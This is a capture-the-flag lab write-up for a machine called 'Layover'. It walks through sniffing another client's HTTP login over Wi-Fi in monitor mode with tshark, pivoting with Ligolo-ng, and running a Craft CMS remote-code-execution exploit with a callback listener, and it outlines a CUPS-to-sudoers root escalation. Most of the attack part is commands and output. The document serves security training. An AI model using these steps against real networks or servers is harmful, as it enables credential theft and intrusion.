Summary

Layover uses a staged attack path. A provided contractor account grants RDP access to a Linux workstation, where a second wireless adapter can be placed in monitor mode to capture another client's HTTP login request. The recovered Craft CMS credentials expose an internal portal, and a Craft CMS vulnerability provides code execution on the web server. From there, encrypted application settings reveal SSH credentials for aporter. The final escalation abuses a vulnerable local CUPS service to write a sudoers rule and obtain root.

WiFi Traffic Capture

Wireshark and TShark are installed on the workstation, so the next step is to inspect wireless traffic for HTTP requests. A managed wireless interface normally receives only frames addressed to the local host, subject to filtering performed by the driver or firmware. It does not provide a complete view of traffic on the channel. In 802.11, capturing the host's traffic and capturing traffic over the air are different operations.

For this reason, wlan3 must be placed in monitor mode. In that mode it receives raw 802.11 frames on the channel, including the other client's POST request. wlan2, left in managed mode, does not expose that traffic because the driver filters frames it does not consider relevant to the host.

Stop anything managing wlan3
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant 2>/dev/null
sudo killall wpa_supplicant 2>/dev/null

Force wlan3 into monitor mode
sudo ip link set wlan3 down
sudo iw dev wlan3 set type monitor
sudo ip link set wlan3 up

Confirm it worked
iw dev wlan3 info        # Type should say "monitor"
ip link show wlan3       # Should show <BROADCAST,MULTICAST,UP,LOWER_UP> now

Tune to the AP's channel
sudo iw dev wlan3 set channel 6

Confirm channel
iw dev wlan3 info        # Should show "channel 6 (...)"

With the adapter configured, filter for HTTP POST requests and print the form fields:

sudo tshark -i wlan3 -Y 'http.request.method==POST' -T fields -e frame.time -e wlan.sa -e ip.src -e http.host -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value

Foothold

The capture reveals a login to portal.international.htb. The administrative endpoint can be reached at http://portal.international.htb/admin; the path can be guessed or discovered with directory enumeration. The captured credentials authenticate to Craft CMS 5.9.8.

The portal is not directly convenient to exploit from the attacking machine, so Ligolo-ng is used to route traffic through the RDP workstation:

# On kali run the proxy:
sudo ./proxy -selfcert

# On the rdp session after transfering the agent
./agent -connect <kali-ip>:11601 -ignore-cert

# On kali:
sudo ip route replace 10.13.37.0/24 dev ligolo

The Craft CMS exploit used is CVE-2026-44011-craftcms-auth-rce. Because the exploit callback must reach the attacker's listener through the pivot, a Ligolo listener forwards the callback port.

1. Keep exploit listener running on your machine
It listens on:
0.0.0.0:42391
2. In the Ligolo proxy console, select the active agent and create a listener:
listener_add --addr 0.0.0.0:42391 --to 127.0.0.1:42391
This means:
> Listen on the pivot machine’s interfaces, then forward received traffic through Ligolo to your local listener.
3. Find the agent machine’s reachable WLAN IP
On the RDP/agent machine:
ip -br addr
Example:
wlan3  10.13.37.131/24
4. Run the exploit using that address:
python cve-2026-44011.py \
  -b 'http://10.13.37.10/' \
  -u 'jenny' \
  -p 'Fl1ghtDeck2026!' \
  -c 'id' \
  --callback-host 10.13.37.131 \
  --listen-port 42391
command output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

The id test returns www-data, confirming code execution. Set up a listener on the RDP connection, then run the exploit again with an RCE payload to obtain a shell.
